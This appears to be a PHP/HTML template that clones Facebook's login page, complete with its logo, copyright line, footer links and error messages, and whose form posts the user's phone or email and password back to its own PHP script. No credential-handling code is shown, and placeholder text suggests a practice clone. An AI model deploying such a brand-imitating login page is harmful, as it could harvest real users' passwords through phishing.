<div class="container">
        <div class="flex">
        <div class="<?php include 'errornameMsg.php'; ?>">
            <p class="errorSm undisplay">The phone number that you've entered doesn't match any account. <a class="bold">Sign up for an account.</a></p>
        </div>
        <div class="<?php include 'forgotErr.php'; ?>">
            <p class="errorSm undisplay">Incorrect password. <a class="bold">Did you forget your password?</a></p>
        </div>
    <div class="header">
    <div class="fblogo"><img src="image/facebooklogo.svg" alt="facebook" style="width: 250px;"></div>
        <!-- <p class="header-a">facebook</p> -->
        <p class="header-b">Facebook helps you connect and share with the people in your life.</p>
    </div>
            <div class="floating">
        <div class="body">
            <div class="notice">
                <img src="image/phone icon.png" alt="facebook" height="30px">
                <p class="top">Get Facebook Lite and browse faster.</p>
            </div>
            <div class="centered undisplay">
            <img src="image/facebooklogo.svg" alt="facebook" width="120px" style="margin-top: .5rem;">
            </div>
            <!--<p class="sm-header">facebook</p>-->

            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" class="form" method="post">

                <input type="text" name="name" id="userName" <?php if($validation->isSetE('submit')): echo "autofocus"; endif; ?> class="<?php
                if($validation->isSetE('submit')){
                        echo "namered";
                }
                ?> width-a" placeholder="Mobile number or Email address" value="<?php if($validation->setValue('name')): echo $validation->setValue('name'); endif; ?>">
                <div class="<?php include 'errornameMsg.php'; ?>">
                <p class="error display">The phone number that you've entered doesn't match any account. <a class="bold">Sign up for an account.</a></p>
                </div>

                <div class="input-container">
                <input type="password" name="password" id="passWord" <?php if($validation->isSet('submit')): echo "autofocus"; endif; ?> class="width-b me" autocomplete="off" placeholder="Password">
                <div onclick="toggler()"><i class="fa fa-eye" id="userName"></i></div>
                <p class="fm-text undisplay" id="toggle" onclick="myFunction()">SHOW</p>
            </div>
            
            <div class="<?php include 'errorpasswordMsg.php'; ?>">
            <p class="error display">The password that you've entered is incorrect. <a class="bold">Forgotten password?</a></p>
            </div>

                <input type="submit" name="submit" class="width-c" value="Log In">
            </form>

            <div class="centered">
                <ul class="ul">
                    <li class="lil"><hr class="hr"></li>
                    <li class="lil">or</li>
                    <li class="lil"><hr class="hr"></li>
                </ul>
            <a href="#" class="lg-fg-pwd display c">Forgotten password?</a><br>
            <div>
            <hr class="display mg-8">
            <button class="button">Create New Account</button><br>
            <a href="#" class="sm-fg-pwd">Forgotten password?</a>
            </div>
        </div>
        </div>
        <!-- <p class="display title"><strong>Create a Page</strong> for a celebrity, band or business.</p> -->
        <div class="footer">
            <div class="left">
                <p class="pd-4-bold">English(UK)</p>
                <p class="pd-4"><a href="#" class="d">Portugues(Brasil)</a></p>
                <p class="pd-4"><a href="#" class="d">Espanol</a></p>
                <p class="pd-4"><a href="#" class="d">Lorem</a></p>
            </div>
            <div class="right">
                <p class="pd-4"><a href="#" class="d">Hausa</a></p>
                <p class="pd-4"><a href="#" class="d">Francais(France)</a></p>
                <p class="pd-4"><a href="#" class="d">Ipsum</a></p>
                <a href="#" class="d"><img src="image/plus icon.png" alt="Add" width="15px"></a>
            </div>  
            
        </div>
        <div class="tryin">
            <a href="Facebook.html" class="centered">About . Help . More</a>
            <p class="lst-msg">Facebook Inc</p>
        </div>
        
    <p class="title display"><strong><a href="#" class="b">Create a Page</a></strong> for a celebrity, brand or business.</p>
</div>
</div>
    <div class="lg-footer">
        <ul class="display">
            <li class="li c">English (UK)</li>
            <li class="li"><a href="#" class="a">Hausa</a></li>
            <li class="li"><a href="#" class="a">Português (Brasil)</a></li> 
            <li class="li"><a href="#" class="a">Français (France)</a></li>
            <li class="li"><a href="#" class="a">Español</a></li>
            <li class="li"><a href="#" class="a">العربية</a></li> 
            <li class="li"><a href="#" class="a">Italiano</a></li>
            <li class="li"><a href="#" class="a">日本語</a></li>
            <li class="li"><a href="#" class="a">Deutsch</a></li>
            <li class="li"><a href="#" class="a">Bahasa Indonesia</a></li>
            <li class="li"><a href="#" class="a">हिन्दी</a></li>
            <li class="li"><a href="#" class="a"><img src="image/plus icon.png" alt="More" width="20px" height="15px"></a></li>
        </ul>
        <hr class="mg-6 display">
        <ul class="display">
            <li class="li"><a href="#" class="a">Sign Up</a></li>
            <li class="li"><a href="#" class="a">Log In</a></li>
            <li class="li"><a href="#" class="a">Messenger</a></li>
            <li class="li"><a href="#" class="a">Facebook Lite</a></li>
            <li class="li"><a href="#" class="a">Watch</a></li>
            <li class="li"><a href="#" class="a">People</a></li>
            <li class="li"><a href="#" class="a">Pages</a></li>
            <li class="li"><a href="#" class="a">Page categories</a></li>
            <li class="li"><a href="#" class="a">Places</a></li>
            <li class="li"><a href="#" class="a">Games</a></li>
            <li class="li"><a href="#" class="a">Locations</a></li>
            <li class="li"><a href="#" class="a">Marketplace</a></li>
            <li class="li"><a href="#" class="a">Facebook Pay</a></li>
            <li class="li"><a href="#" class="a">Groups</a></li>
            <li class="li"><a href="#" class="a">Jobs</a></li>
            <li class="li"><a href="#" class="a">Oculus</a></li>
            <li class="li"><a href="#" class="a">Portal</a></li>
            <li class="li"><a href="#" class="a">Instagram</a></li>
            <li class="li"><a href="#" class="a">Local</a></li>
            <li class="li"><a href="#" class="a">Fundraisers</a></li>
            <li class="li"><a href="#" class="a">Services</a></li>
            <li class="li"><a href="#" class="a">Voting Information Centre</a></li>
            <li class="li"><a href="#" class="a">About</a></li>
            <li class="li"><a href="#" class="a">Create ad</a></li>
            <li class="li"><a href="#" class="a">Create Page</a></li>
            <li class="li"><a href="#" class="a">Developers</a></li>
            <li class="li"><a href="#" class="a">Careers</a></li>
            <li class="li"><a href="#" class="a">Privacy</a></li>
            <li class="li"><a href="#" class="a">Cookies</a></li>
            <li class="li"><a href="#" class="a">AdChoices</a></li>
            <li class="li"><a href="#" class="a">Terms</a></li>
            <li class="li"><a href="#" class="a">Help</a></li>
        </ul>
        <p class="display mg-9">Facebook &#169; 2021</p>
    </div>
    </div>